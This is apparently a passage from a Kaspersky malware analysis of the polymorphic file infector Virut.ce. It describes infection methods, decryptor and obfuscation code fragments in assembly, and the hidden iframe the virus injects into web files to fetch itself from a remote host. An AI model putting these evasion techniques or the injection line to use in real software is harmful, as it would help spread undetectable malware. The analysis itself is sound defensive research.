It\ninfects executable files using the very latest techniques and that makes detecting and\ntreating those files particularly difficult. The current means by which most malicious files are\nactively spread is server-side polymorphism. Infecting files is not as popular as it used to be\nabout five years ago. This is largely because the level of file emulation has improved greatly.\nAs such, you have to hand it to the authors of Virut.ce – they weren’t at all put off by the\ndifficulties they faced in trying to infect executable files.\n\n\n-----\n\nThe technology implemented in Virut.ce accurately reflects the very latest methods used to\nwrite malware. Anti-emulation and anti-debugging tools are widely used, such as the tick\ncount received when using multiple rdtsc instructions, series of GetTickCount API functions\nand the calling of multiple fake API functions.\n\nVirut is the fastest-mutating virus known, with a new variant appearing as often as once a\nweek. This indicates that its creators are closely monitoring antivirus databases so that they\ncan take prompt action when a new Virut signature is released. As soon as this happens, the\ncreators modify the virus so that once again it is undetectable. Interestingly, the malicious\nprogram ensures that its latest version is downloaded to compromised computers by taking\nadvantage of infected HTML files as described below.\n\nThis article reviews the methods used to infect files. Obfuscation will also be covered as it is\napplied each time an executable file is infected. Additionally, the evolution of the virus’\ncomponents will be examined, from their emergence up until the present time. All of the\nstatistics that appear in this article have been collected using Kaspersky Lab’s own\nKaspersky Security Network (KSN) technology.\n\n## A brief review of statistics and propagation\n\nThe first Virut variant was called Virut.a and appeared back in mid-2006. From that moment\non, the strain has evolved steadily, reaching Virut.q sometime in September 2007.\n\nVirut.q was quite popular at the time, but only rarely occurs these days. Its developers\ndiscontinued ‘support’ for it during the second half of 2008, but then in the first week of\nFebruary 2009, a new variant called Virut.ce appeared. It would seem that the creators of the\nvirus spent the interim period perfecting new infection techniques, encryption algorithms and\nanti-emulation methods.\n\nIt should be pointed out here that any reference to the terms ‘Virut’, ‘the virus’ etc. that\nappear later in the article, refer to Virus.Win32.Virut.ce.\n\nAt present, the Virut.ce variant is the second most popular of all of the versions of\nVirus.Win32.*.* detected on users’ computers.\n\n\n-----\n\n**The Top 20 most frequently detected viruses**\n**January 2009 – May 2010**\n\nFrom the graph below it can clearly be seen that the propagation acitivity of Virut.ce\nincreases with time.\n\n\n-----\n\n**Number of computers infected with Virut.ce**\n**May 2009 – May 2010**\n\nThe virus propagates through infected files, both executable and HTML, or smaller programs\ndesigned to crack licensed software. Such programs generally include key generators\n(keygens) and direct file modification utilities (cracks). More specifically, Virut propagates as\npart of RAR/SFX archives with straightforward names like\n‘codename_panzers_cold_war_key.exe’ or\n‘advanced_archive_password_recovery_4.53_key.exe’. Such archives include a copy of\nVirut, either in its original form, or in an infected file alongside the desired program.\n\n## Virut’s functionality\n\nNow let us look at the most important feature – Virut’s payload. It is common knowledge that\nmost malware programs are exclusively designed for financial gain and Virut is certainly no\nexception. Effectively, it is a backdoor which first attempts to infiltrate the address space of\nthe ‘explorer.exe’ process (‘services.exe’, ‘iexplore.exe’), then it connects to the irc.zief.pl\nand proxim.ircgalaxy.pl URLs via IRC-protocol and waits for commands to arrive. The\nprocedure looks quite conventional, as does the list of processes the virus attempts to\nterminate as shown in the screenshot below. This list includes processes belonging to\nantivirus programs such as ‘nod32’, ‘rising’, ‘f-secure’ and a number of others.\n\n**Screenshot showing part of the decrypted static body of Virut.ce**\n\n**and including the names of processes that are terminated by the virus**\n\nInterestingly, the virus infects all of the *.htm, *.php and *.asp files stored on the victim\ncomputer. To do so, it adds the following line to them: ‘<iframe src = http://jl.*****.pl/rc/ style =\n‘display:none’>’. This downloads the latest version of Virut by exploiting a PDF-file\nvulnerability. This line may change from version to version within the ‘ce’ variant. For\nexample, the letter ‘u’ may be substituted by ‘&#117’, which will not affect the browser in any\nway, but will prevent static signatures from working.\n\n## General discussion and method of infection\n\nVirut.ce uses EPO technology or rewrites the entry point as an infection technique. One or\ntwo polymorphic decryptors are used in conjunction with it too.\n\nThe Entry Point Obscuring (EPO) technique works by preventing detection of the instruction\nto jump to the virus body. Typically, this is implemented by replacing a random instruction in\nthe program’s original code or the parameter of the jump instruction. Below is an example of\n\n\n-----\n\nhow an instruction and the jump address can be substituted.\n\nThe term ‘rewriting the entry point’ implies modifying the PE header of the file being infected,\nspecifically rewriting the AddressOfEntryPoint field in the IMAGE_NT_HEADERS32\nstructure. Consequently file execution will start directly with the virus component.\n\nAs discussed earlier, the virus adds only one or two decryptors during infection – let us call\nthem ‘Init’ and ‘Main’. The Main decryptor is located in every file touched by Virut.ce, while\nthe Init decryptor occurs only occasionally. Let us take a closer look at the function and\ngeneral appearance of this decryptor.\n\nThe primary purpose of the Init decryptor is to decipher the first layer of the virus’ main body\nin order to hand over control to it. However, the bulk of the virus’ body remains encrypted\neven after this initial decryption has occurred. The Init decryptor is a small piece of code\nbetween 0x100 and 0x900 bytes long and contains many purposeless instructions that\nprevent static antivirus signatures from working. The decryptor is placed at the end of a\nsection of code if there is a sufficient number of zeros. The decryptor works as follows:\n\n1. It writes the size of the encrypted section to the register;\n2. Performs a logical/arithmetic operation on the encrypted section with a constant key;\n3. Increments/decrements the pointer to the encrypted section;\n4. Jumps back to instruction 2 until everything is decrypted.\n\n\n-----\n\nThe main body of the virus is 0x4000 to 0x6000 bytes in size and is located at the end of the\nlast section, which is extended specifically for this purpose and flagged as write/readaccessible and executable.\n\nThus, four ways for possible infection exist:\n\nInit Decryptor + EPO:\n\nInit Decryptor + modifications to the EP:\n\n\n-----\n\nEPO only:\n\nRewriting the entry point only:\n\n\n-----\n\nThese four methods of contagion cover all the possible ways to infect a file or modify its\nstructure.\n\n## Primary decryption of Virut.ce’s body\n\nBefore we go on to discuss the payload of the virus’ main body, let us look at the Init\ndecryptor in a genuinely infected file.\n\n\n-----\n\n**Fragment of a file infected by Virus.Win32.Virut.ce which includes the Init decryptor**\n\n\n-----\n\n**The disassembled code of the Init decryptor**\n\nThe first of the screenshots above shows a fragment of an infected calc.exe file. The\nboundaries of the code section are marked and the Init decryptor is highlighted also. The\nsecond screenshot shows the disassembled code of the Init decryptor. The four logical\nelements discussed above are shown in red ovals.\n\nIn this example, the ECX register is filled with multiple push/pop instructions and decrypted\nwith the adc instruction. However, this procedure has not always been the same. Virut.ce has\nevolved rapidly in the last year and so has the incorporated Init decryptor. If the virus body\nsize written into the registry has been modified once (mov reg, dword changed to push\ndword; pop reg), the decryption procedure changes more than once (in date order):\n\n1. ADD/SUB [mem], dword;\n2 ROL/ROR [mem] byte;\n\n\n-----\n\n3. ADC/SBB [mem], byte;\n4. ADD/SUB [mem], byte;\n5. ADD/SUB [mem], word;\n6. ADC/SBB [mem], word;\n7. ADC/SBB [mem], dword;\n\nNow that we have reviewed the general schemes by which infection occurs and the primary\nprocessing of the virus’ main body, we can move on to reviewing the execution of the major\npart of Virut, which is always located at the end of the last section.\n\n## Restoring the original code\n\nThe code of the main body can be subdivided into three groups according to purpose: the\nrestoration of the original function/entry point, the decryption of the static body and the\nexecution of the payload.\n\nBefore we review each element, let us review the structure of the virus body and have a look\nat the associated part of the file.\n\n**The structure of the main body of Virut.ce**\n\nAs can be seen in the picture, the main body added to the end of the code’s last section is\nmade up of two types of components: the encrypted static body and the executable code.\nThe executable part contains a code which performs anti-emulation, restores the original\nentry point and/or function and decrypts the static body. It is scattered over the main body\nand may be located at the top or bottom or be split in two. Interestingly, the executable part is\n\n\n-----\n\nalso heavily obfuscated. This complicates detection as there are no static elements in the\noriginal file and a static element is obviously encrypted using different keys and/or\nalgorithms, as will be demonstrated in the discussion below.\n\n**File fragment containing the main body of Virus.Win32.Virut.ce**\n\nThe above picture shows a screenshot of a fragment of a file infected with\nVirus.Win32.Virut.ce. The executable part of the virus’ main body is highlighted with a red\noval; it can also be identified visually as it contains a lot of zero bytes. In this instance, the\nvirus has not used the Init decryptor during the infection process; otherwise, all of the\nsections would look similar and be encrypted.\n\nLet us now look at the block dedicated to restoring the file’s original part. The logic of this\nblock may be represented as follows:\n\n1. CALL [address with a small increment];\n2. Store the original contents of the registers;\n3. Add the address pointing to kernel32.dll to the EBX register;\n4. Calculate the pointer to the address of the instruction following CALL in item 1;\n5. Perform an arithmetic/logical operation on the address obtained in instruction 4.\n\nIt should be noted that the virus uses the EPO technique only if it identifies an API-function\nbeing called from kernel32.dll. This function call may be identified by the calls through either\nthe 0x15FF or 0xE8 opcodes, with a subsequent JMP instruction (0x25FF). If such a function\nis identified it is replaced with the JMP instruction (0xE9) which leads to instruction 1 in the\nprevious diagram. Then the address of the replaced function from kernel32.dll is placed into\nthe EBX register. If only the entry point has been modified, the value at [ESP + 24] is placed\n\n\n-----\n\ninto the EBX register – this is the address for the application to return to kernel32.dll. Later\non, the value stored in this register will be used to obtain the addresses of exported DLL\nfunctions. If the EPO technique is used, the value at [ESP + 20] will contain the address of\nthe instruction following the call of the patched API-function; otherwise it will contain the\naddress of the original entry point.\n\nIf obfuscation is excluded, the simplest way to restore the entry point and/or function will\nappear as follows (assume the GetModuleHandleA function was replaced):\n\nCALL $ + 5\nPUSHAD\nMOV EBX, [GetModuleHandleA] XOR [ESP + 20h], Key\n\nThis code is completely in line with the general logic of the entire block. Now, let us see how\nall of these stages have changed over time. The only stage we will not dwell on is the second\noperation (save the original contents of the registers) as it is always implemented by the\nPUSHAD instruction.\n\nLet us review each of the block’s logical elements in detail.\n\nThe first stage – the CALL instruction – has not changed much over time. Originally, it looked\nlike CALL $ + 5, later CALL $ + 6(7,8), then CALL $ + 0xFFFFFFFx, which is a call\n‘backwards’ . It may seem that this operation is of little importance and can be scrapped, but\nthat is not true. This address is used to restore the entry point/original function as well as to\naddress the decryption keys and the start of the static code. We will mention this address\nagain when we discuss the Main decryptor.\n\nStage 3 is modified more often than stage 1 and may be implemented in several ways:\n\nMOV EBX, [ApiFunc]/MOV EBX, [ESP + 24h];\nPUSH [ApiFunc]/[ESP + 24h]; POP EBX;\nSUB ESP, xxh; PUSH [ESP + 24h + xx]; POP EBX;\nLEA EBX, [ESP + xxh]; MOV EBX, [EBX + 24h – xx];\nADD ESP, 28h; XCHG [ESP – 4], EBX;\n\nThis list of examples is by no means exhaustive, but gives a general understanding of how\nthis stage evolved with time. Additionally, intermediate manipulations of the ESP and EBX\nregisters occur.\n\nLet us review the last stage, which restores the address of the original entry point or the\npatched CALL instruction. This stage is modified every two or three weeks.\n\nAfter the PUSHAD instruction is called, the ESP register – the indicator to the stack – will be\ndecremented by 0x20 and so ESP + 20h will store a value supplied by the last CALL\ninstruction. An arithmetic/logical operation is applied to this value and the required figure is\n\n\n-----\n\nobtained.\n\nBelow are some of the possible sequences of operation that perform the actions described\nabove:\n\nXOR/AND/OR/ADD/SUB [ESP + 20h], const;\nMOV [ESP + 20h], const;\nLEA EBP, [ESP + x]; MOV/OR/ADD/SUB/XOR EBP, const; XCHG [EBX + 20h – x],\nEBP;\nMOV EBX, ESP; PUSH const; POP [EBX + 20h];\nPUSH const; POP [ESP + 20h].\n\nAgain, this list is not exhaustive, but gives an understanding of the overall trend. Various\nintermediate operations are added.\n\nThe screenshot below presents a fragment of an infected file which contains all of the\noperations described above highlighted in red ovals.\n\n**Screenshot of a file infected with Virus.Win32.Virut.ce,**\n**containing a code to restore the original entry point**\n\nFor clarity, the above code examples did not include obfuscation. However, obfuscation is\nused extensively in all of the file sections added by the virus, including the Init decryptor and\nthe entire executable part of the main body. It is obfuscation that completely blocks static\nsignatures from detecting the virus as it radically modifies the appearance of the code\nwithout changing its performance. Below are some examples of junk instructions which do\nnot perform any meaningful operations and are only used to obfuscate the code:\n\nXCHG reg1, reg2; XCHG reg2, reg1; (used together)\nSUB reg1, reg2; ADD reg1, reg2; (used together)\nMOV reg, reg; OR reg, reg; AND reg, reg; XCHG reg, reg; LEA reg, [REG];\nCLD, CLC, STC, CMC, etc.\n\n‘reg1’ and ‘reg2’ stand for different registers; ‘reg’ stands for the same register within a single\nexpression\n\nArithmetic/logical operations with an arbitrary second operand:\n\nADC reg, const; SBB reg, const; XOR reg, const; etc.\n\n\n-----\n\nIn the screenshots below, elements of obfuscation are highlighted in red ovals:\n\n**Screenshots containing code of the virus’ main body with obfuscation elements shown in ovals**\n\nThe screenshot on the left shows very clearly that junk instructions make up some 70-80% of\nthe entire code.\n\nThe examples above present some cases of obfuscation that occur most often and are not\nexhaustive. As the virus evolves, new obfuscation techniques evolve alongside it.\n\nWe have reviewed the first stage of execution of the virus’ main body. We will not dwell on\nthe stages that implement various anti-emulation and anti-debugging techniques and move\nstraight on to the Main decryptor.\n\n## Decrypting the main body\n\nThe execution of the decryption code starts after the virus completes its initial activities such\nas restoring the patched code, creating a specifically named object and obtaining the\naddresses of the functions to be used from system DLLs and anti-cycles.\n\nIf the Main decryptor is viewed in a disassembler, its code will appear utterly meaningless, as\nthe RETN instruction is called which hands over control to a randomly chosen position.\nBefore the main decryption process starts, the RETN instruction (0C3h) is replaced with\nCALL (0E8h). This is accomplished by an instruction which may typically look like this:\n\nADD/SUB/XOR [EBP + xx], bytereg\n\nIn the above, EBP points to the address of the instruction following CALL and bytereg is one\nof the byte registers.\n\n\n-----\n\nWe can therefore consider that the decryption cycle starts after RETN is changed to CALL.\nNext follows the decryption cycle which is just as obfuscated as the rest of the virus’ body is.\nNot only are a large number of algorithms used, but many of them are more complex than\nthose used within the Init decryptor. Typically, between two to six logical/arithmetic operations\nare used in combination. In algorithms, the EDX register contains the decryption key and the\nEAX register contains the virtual address where the static body starts. The registers contain\ninstructions which may look like this:\n\nMOVZX/MOV dx/edx, [ebp + const] LEA eax, [ebp + const]\n\nThe EBP register contains the address which follows the CALL instruction; this address was\nmentioned earlier when we reviewed the first stage of the logical scheme which restores the\noriginal part of the file. The instructions performing these two operations have also been\nmodified with time, but we will not discuss them here.\n\nThe algorithms in use are very diverse so we will only provide examples of the most\ninteresting ones:\n\nROL DX, 4\nXOR [EAX], DL\nIMUL EDX, EDX, 13h\n\nADD [EAX], DL\nROL DX, 5\nIMUL EDX, 13h\n\nXOR [EAX], DH\nADD [EAX], DL\nXCHG DH, DL\nIMUL EDX, 1Fh\n\nXOR [EAX], DH\nXCHG DH, DL\nADD [EAX], DH\nIMUL EDX, 1Fh\n\nXOR [EAX], DL\nADD [EAX], DH\nIMUL EDX, 2Bh\nXCHG DH, DL\n\nThe instructions used changed from version to version, but no clear trend can be observed:\nrelatively simple algorithms were replaced by more complex ones, which in turn were\nreplaced by simpler ones again. It appears that the virus creator’s ultimate goal was to use\n\n\n-----\n\nan algorithm that could better resist possible brute force attempts. This may well account for\nthe continuous changes to the algorithms, as well as the irrationality of those changes.\n\n**A disassembled fragment of the Main decryptor**\n\nThe screenshot above contains a fragment of the Main decryptor’s disassembled code. The\nmeaningful (non-junk) instructions discussed above are highlighted in red ovals. Some junk\noperations are also present here for obfuscation purposes.\n\n\n-----\n\nTo continue the discussion regarding the execution of the infected file, let us move on to the\nexecution of the malicious payload contained within the decrypted static body. It typically\nstarts with a CALL instruction to a nearby cell in order to calculate the virtual address of the\nbeginning of the executable code and use it later on for addressing.\n\n**The virus’ decrypted static body**\n\nThe screenshot above shows the virus’ decrypted static body. The lines highlighted by the\nred ovals carry specific parts of the malicious payload. For example, ‘JOIN’ and ‘NICK’ are\nIRC commands, ‘irc.zief.pl’ and ‘proxim.ircgalaxy.pl’ are remote IRC servers that Virut\nattempts to contact; ‘SYSTEMCurrentControlSet ServicesSharedAccess\nParametersFirewallPolicy StandardProfileAuthorizedApplications List’ is the registry key\ncontaining the list of trustworthy programs for the Windows firewall.\n\n## Conclusion\n\n\n-----\n\nVirut.ce is interesting for the variety of file infection mechanisms that it uses, as well as its\npolymorphism and obfuscation techniques. However, its malicious payload is quite\ncommonplace. This version of Virut was the first to combine all of the aforementioned\nmalicious techniques into a single piece of malware. Some malicious programs may be\nheavily obfuscated, others may employ a wide range of anti-emulation techniques, but\nVirut.ce combines all of these in one package. This article provides a detailed account of\nthese malicious techniques.\n\nThe article is not an attempt at a complete description of Virut.ce, nor is it intended to be. We\ncould have gone deeper into how the virus communicates with the IRC server, or examined\nmore closely the details of how files are infected, but this time we deliberately dwelt on Virut’s\nbasic mechanisms. Additionally, publishing a detailed description of the anti-emulation\ntechniques would be irresponsible as malware writers could then exploit this information.\n\nAssessing the virus’ future is quite a difficult task. As of April-May 2010, no new versions of\nVirut.ce have been detected; however, this does not mean that its evolution has stopped. It is\nquite possible that the virus writers have taken a break in order to develop further changes to\nthe virus that could render it immune to current antivirus products.\n\nCurrently, all of Kaspersky Lab’s products are able to successfully detect and treat\nVirus.Win32.Virut.ce and as soon as a new variant is detected, its signature will be added to\nthe Kaspersky Lab antivirus databases.\n\nWe hope that this article will be of assistance to virus analysts and those interested in the\nstudy of malware. These days, anti-emulation and anti-debugging techniques are commonly\nused in most malicious programs that propagate by means of server-side polymorphism. An\nawareness of the technologies implemented in Virus.ce helps to broaden our understanding\nof many other malicious programs, including polymorphic viruses employing similar\nmethodologies.\n\n[Malware Descriptions](https://securelist.com/tag/malware-descriptions/)\n\nAuthors\n\n[Vyacheslav Zakorzhevsky](https://securelist.com/author/vyacheslavz/)\n\nReview of the Virus.Win32.Virut.ce Malware Sample\n\nYour email address will not be published.
